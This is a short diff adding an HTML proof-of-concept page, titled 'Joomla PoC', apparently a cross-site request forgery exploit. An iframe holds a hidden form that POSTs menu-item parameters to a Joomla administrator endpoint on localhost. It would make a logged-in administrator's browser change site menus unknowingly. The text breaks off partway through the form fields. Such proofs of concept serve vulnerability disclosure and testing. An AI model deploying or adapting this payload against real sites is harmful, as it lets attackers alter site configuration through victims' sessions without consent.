@@ -1,0 +1,10 @@
+<html>
+<head>
+<title>Joomla PoC</title>
+<head>
+<body>
+    <iframe srcdoc='<form method="POST" action="http://localhost/joomla/administrator/index.php?option=com_menus&view=item&client_id=0&layout=edit&id=0">
+        <input type="hidden" name="jform[params][menu_show]" value="1">
+        <input type="hidden" name="jform[params][menu_text]" value="1">
+        <input type="hidden" name="jform[params][secure]" value="0">
+        <input type="hidden" name="jform[type]"
